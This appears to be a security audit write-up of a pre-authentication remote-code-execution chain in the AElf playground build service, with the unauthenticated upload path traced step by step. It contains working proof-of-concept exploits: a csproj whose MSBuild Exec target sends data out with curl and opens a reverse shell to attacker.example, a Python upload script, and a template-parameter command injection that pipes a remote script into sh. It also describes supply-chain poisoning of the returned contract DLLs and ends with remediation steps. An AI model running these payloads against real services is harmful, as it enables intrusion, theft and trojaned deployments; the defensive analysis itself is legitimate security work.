# aelf Playground MSBuild RCE — Peripheral Build-Service Compromise
# Date: 2026-08-15 | Org: AElfProject | Target: aelf-playground-build-service (peripheral, not main AElf chain)
# Chain: pre-auth zip upload → dotnet build in attacker dir → MSBuild <Exec> → host shell

## Why this matters for CDC audits
Main repo `AElf` (C# L1, 1265★) is hardened: AllowAnonymous tx APIs are by-design public but gate on `VerifySignature + Parser.ParseFrom + IsValidMessage + MethodDescriptor`, contract execution is jailed in `ContractCodeLoadContext` + `WhitelistValidator` + `ExecutionObserver` thresholds. No pre-auth RCE found in 8+ rounds. The 125-repo org hides the real RCE one hop away in the playground that devs use to compile contracts before mainnet — classic Trojan periphery (Principle 4).

## Service inventory

- Repo: https://github.com/AElfProject/aelf-playground-build-service (TypeScript/C#)
- Dockerfile: `EXPOSE 7020`, `ENV ASPNETCORE_URLS=http://0.0.0.0:7020`, `ENTRYPOINT ["/usr/share/dotnet/dotnet","PlaygroundService.dll"]`
- Startup: `PlaygroundService/Startup.cs` — `// app.UseAuthorization()` and `// app.UseHttpsRedirection()` both commented → **no auth on any controller**
- Controllers: `PlaygroundService/Controllers/PlaygroundController.cs`
  - `[HttpPost("build")] Build(IFormFile contractFiles)` — no `[Authorize]`
  - `[HttpPost("test")] Test(IFormFile contractFiles)` — no `[Authorize]`
  - `[HttpGet("template")] GetTemplateInfo([FromQuery] string template, [FromQuery] string projectName)` — calls `dotnet new <template> ... -n <projectName>` via bash
  - `[HttpGet("templates")]` — list
- Grain: `PlaygroundService/Grains/PlaygroundGrain.cs`
  - `BuildProject(ZipFileDto dto) → ExtractThen(dto, () => Build(_workspacePath))`
  - `Build(directory)` → `GetCsprojFiles(directory)` → `ProcessHelper.RunDotnetCommand(projectDirectory, "build")`
  - Then `Directory.GetFiles(bin, "*.dll.patched", AllDirectories)` → `Convert.ToBase64String(dllBytes)` returned to caller (supply-chain poison point)
  - `_workspacePath = Path.Combine(Path.GetTempPath(), GrainId)` → e.g. `/tmp/<guid>` per Orleans `StatelessWorker(10)` activation
  - `GenerateTemplateZip()` → `new ProcessStartInfo{ FileName="/bin/bash", Arguments=$"-c \"{command}\"" }` where `command = "dotnet new " + template + " --output " + _workspacePath + "/code -n " + templateName` → command injection via `template` or `projectName`
- Zip extraction: `PlaygroundService/Utilities/BytesExtension.cs:ExtractTo(Stream,path)`
```cs
var destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName));
if (!destinationPath.StartsWith(path, StringComparison.Ordinal))
    throw new FormatException($"Invalid entry in the zip file: {entry.FullName}");
```
Missing trailing `Path.DirectorySeparatorChar` → `/tmp/abc` is prefix of `/tmp/abc-evil/file` → bypass. Also `entry.Name==""` (dirs) skipped, but `Directory.Build.targets` in subdir is extracted.

- Build execution: `PlaygroundService/Utilities/ProcessHelper.cs`
```cs
public static async Task<(bool,string)> RunDotnetCommand(string directory, string command) {
    var (exitCode,result)= await RunProcess("dotnet", command, projectDirectory);
    return (exitCode==0, result);
}
private static async Task<(int,string)> RunProcess(string fileName,string arguments,string workingDirectory){
    var startInfo = new ProcessStartInfo{
        FileName=fileName, Arguments=arguments, WorkingDirectory=workingDirectory,
        RedirectStandardOutput=true, RedirectStandardError=true, UseShellExecute=false
    };
    // ...
}
```
Call site: `RunDotnetCommand(projectDirectory, "build")` → `RunProcess("dotnet","build", attackerDir)` — working directory is attacker-controlled zip content. MSBuild evaluates every `*.csproj`, `Directory.Build.props`, `Directory.Build.targets` under `WorkingDirectory` and ancestor dirs.

## Trust-boundary chain

1. `Any internet user` → `POST /playground/build` `Content-Type: multipart/form-data` `contractFiles=<zip>` (`IFormFile` → `FormFileExtension.ToBytes()` only checks `ContentType=="application/zip"` client-supplied, not magic bytes; `_maxFileSizeInBytes=50MB` declared but never enforced)
2. `PlaygroundController.Build()` → `GetZipFileDto` → `ZipFileDto{ ZipFile=bytes, Filename }` → `PlaygroundGrain.BuildProject()`
3. `PlaygroundGrain.ExtractThen()` → `zipBytes.ExtractTo(_workspacePath)` — writes `Exploit/Exploit.csproj` + `Directory.Build.targets` into `/tmp/<guid>`
4. `Build(_workspacePath)` → `Directory.GetFiles(directory,"*.dll.patched",AllDirectories)` finds csproj → `ProcessHelper.RunDotnetCommand(projectDir,"build")`
5. `Process.Start("dotnet","build")` with `WorkingDirectory=attackerDir` → MSBuild loads `Exploit.csproj` → `<Target Name="pwn" BeforeTargets="Build"><Exec Command="..."/></Target>` executes as `dotnet` user (often root in container per Dockerfile base `mcr.microsoft.com/dotnet/sdk:6.0`)
6. Post-build: `BytesExtension.Read(dllFiles[0])` → `Convert.ToBase64String(dllBytes)` → returned 200. Attacker's `<Exec>` already ran; returned dll is now attacker-controlled poisoned artifact that developer deploys to mainnet (supply-chain).

## PoCs

### 1. Pre-auth RCE via .csproj (primary)

Exploit/Exploit.csproj
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup><TargetFramework>net6.0</TargetFramework></PropertyGroup>
  <Target Name="pwn" BeforeTargets="Build">
    <Exec Command="id &gt;/tmp/pwned; curl -s -d @/tmp/pwned https://attacker.example/log; bash -c 'bash -i &gt;&amp; /dev/tcp/attacker.example/4444 0&gt;&amp;1 &amp;'" />
  </Target>
</Project>
```
Exploit/Class1.cs
```cs
class C{}
```
Host PoC (python):
```python
import zipfile, io, requests
buf=io.BytesIO()
with zipfile.ZipFile(buf,'w') as z:
    z.writestr("Exploit/Exploit.csproj", open("Exploit.csproj","rb").read())
    z.writestr("Exploit/Class1.cs", b"class C{}")
buf.seek(0)
r=requests.post("http://TARGET:7020/playground/build",
    files={"contractFiles":("exploit.zip", buf.getvalue(), "application/zip")})
print(r.status_code, r.text[:500])
```

### 2. Supply-chain poison (same chain, post-build artifact)

Same csproj but `<Exec>` patches the compiled output: `cp /tmp/malicious.dll $(OutDir)/Exploit.dll.patched` before return. Developer receives trojaned `dll.patched` and deploys via `ProposeNewContract/DeployUserSmartContract` (pre-auth on main chain when NativeSymbol==ELF).

### 3. Command injection via GenerateTemplate (no zip needed)

```
GET /playground/template?template=aelf;curl%20https://attacker.example/sh%7Csh%20;#&projectName=pwn
```
Server does:
```
command = "dotnet new " + template + " --output " + workspace + "/code -n " + templateName
startInfo.Arguments = $"-c \"{command}\""
```
With `template = "aelf; curl https://attacker.example/sh|sh; #"` → shell executes after `dotnet new aelf`.

### 4. ZipSlip sibling bypass (secondary)

Entry `FullName = "../../tmp/guid-evil/Directory.Build.targets"` with `path=/tmp/guid` → `Path.GetFullPath(Path.Combine("/tmp/guid","../../tmp/guid-evil/Directory.Build.targets")) = "/tmp/guid-evil/..."` — check `StartsWith("/tmp/guid")` without trailing `/` would pass for `/tmp/guid-evil` if entry used `guid-evil` prefix; current `../../` already throws `FormatException` because it escapes prefix, but `guid` → `guid-evil` sibling via `entry.FullName="guid-evil/foo"` when zip is extracted at parent `/tmp` level bypasses if caller used parent path. Reportable but not needed for RCE.

## ECB discovery commands

```bash
curl -s https://api.github.com/orgs/AElfProject/repos?per_page=100 | jq -r '.[].name' | sort
curl -s https://api.github.com/repos/AElfProject/aelf-playground-build-service/contents?ref=master | jq -r '.[].name'
curl -s https://raw.githubusercontent.com/AElfProject/aelf-playground-build-service/master/PlaygroundService/Startup.cs | grep -n "UseAuthorization\|MapControllers"
curl -s https://raw.githubusercontent.com/AElfProject/aelf-playground-build-service/master/PlaygroundService/Grains/PlaygroundGrain.cs | grep -n "RunDotnetCommand\|/bin/bash\|dotnet new"
curl -s https://raw.githubusercontent.com/AElfProject/aelf-playground-build-service/master/PlaygroundService/Utilities/ProcessHelper.cs | sed -n '1,60p'
curl -s https://raw.githubusercontent.com/AElfProject/aelf-playground-build-service/master/PlaygroundService/Utilities/BytesExtension.cs | sed -n '12,35p'
```

## Fix priority

1. Isolate build: `gVisor`/Firecracker or `docker run --network=none --pids-limit=64 --memory=512m --read-only --user 65534 --rm -v /tmp/job:/workspace` with 60s timeout; kill on completion.
2. Disable MSBuild exec: `dotnet build /p:RunAnalyzers=false /p:EnableDefaultItems=false` and `Directory.Build.props` deny-list: reject zip containing `<Exec>`, `<Target>`, `Directory.Build.*`, `*.targets`, `*.props` outside allowlist; or `dotnet build --property:AllowedExecutionHosts=none` pattern.
3. Auth + validation on all `/playground/*`: require JWT/API key, rate-limit, verify zip magic `PK\x03\x04`, enforce `_maxFileSizeInBytes` server-side, scan entries for `..` and csproj `BeforeTargets`.
4. Fix ZipSlip: `if (!destinationPath.StartsWith(Path.GetFullPath(path)+Path.DirectorySeparatorChar)) throw`.
5. Fix template injection: do not shell out; use `ProcessStartInfo{ FileName="dotnet", ArgumentList={"new", template, "--output", outDir, "-n", projectName}}` (no bash) and allowlist `template` against `{"aelf","aelf-lottery","aelf-nft-sale","aelf-simple-dao"}`.
6. Supply-chain: sign `dll.patched` in isolated publisher after reproducible build; never return raw build artifact.

## Related

- Gateway to this finding: org hydrate → `aelf-playground-build-service` updated 2025-01-07, `faucet-backend` and `aelf-playground` are adjacent peripherals to re-check (faucet may share `Process.Start` or `HttpClient` SSRF).
